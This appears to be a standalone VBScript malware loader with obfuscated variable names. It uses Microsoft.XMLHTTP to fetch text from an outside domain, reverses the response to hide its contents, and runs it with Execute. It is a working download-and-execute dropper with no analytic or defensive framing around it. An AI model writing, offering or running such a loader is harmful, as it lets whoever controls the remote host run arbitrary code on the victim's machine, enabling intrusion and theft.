JdZqW="YUbTOfCr1Ko6Qgvo5nDlGZxpl"
URL="http://dilaingil.info/?c=r&" & JdZqW
set P4Or3=CreateObject("Microsoft.XMLHTTP")

P4Or3.open "GET",URL,false
P4Or3.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
P4Or3.setRequestHeader "User-Agent", "RemoveIT"
P4Or3.send "Z"

For i = Len(P4Or3.responsetext) to 1  Step-1
    var= Mid(P4Or3.responsetext,  i  , 1)
    KZSvs = KZSvs & var
Next

execute "Execute KZSvs & JdZqWP4Or3"

